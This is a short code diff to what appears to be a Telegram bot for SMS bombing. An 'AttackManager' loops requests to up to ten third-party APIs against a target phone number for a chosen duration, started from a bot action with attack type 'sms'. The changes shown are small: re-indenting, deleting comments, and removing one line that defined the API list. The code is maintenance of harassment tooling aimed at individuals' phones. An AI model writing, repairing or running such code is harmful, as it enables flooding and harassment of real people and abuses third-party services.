@@ -335,11 +335,11 @@ class AttackManager {
 
   //
 
-  async runAttack(userId, phone, duration, apis) {
+async runAttack(userId, phone, duration, apis) {
   const attack = this.activeAttacks.get(userId);
   if (!attack) return;
 
-  const limitedApis = apis.slice(0, 10); // 🔥 max 10 APIs
+  const limitedApis = apis.slice(0, 10);
 
   while (attack.running && Date.now() < attack.endTime) {
 
@@ -351,7 +351,6 @@ class AttackManager {
       );
     }
 
-    // 🔥 delay increase (stability)
     await new Promise(resolve => setTimeout(resolve, 1000));
   }
 
@@ -654,7 +653,7 @@ bot.action(/dur_(.+)/, async (ctx) => {
   const attackType = session.attackType || 'sms';
   const success = await manager.startAttack(userId, phone, duration, attackType);
   //
-  const apis = APIS.slice(0, 10);
+  
   //
   if (!success) {
     await ctx.editMessageText('❌ Failed to start attack. Please try again.');
